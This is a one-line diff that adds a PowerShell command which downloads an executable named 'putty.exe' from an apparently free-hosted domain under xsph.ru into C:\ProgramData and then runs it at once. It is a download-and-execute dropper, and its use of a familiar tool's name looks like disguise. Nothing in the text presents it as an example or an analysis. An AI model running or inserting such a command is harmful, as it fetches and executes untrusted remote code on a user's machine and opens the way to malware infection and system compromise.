@@ -1,0 +1,1 @@
+$client = new-object System.Net.WebClient ; $client.DownloadFile("http://f0488450.xsph.ru/putty.exe","C:\ProgramData\putty.exe") ; C:\ProgramData\putty.exe
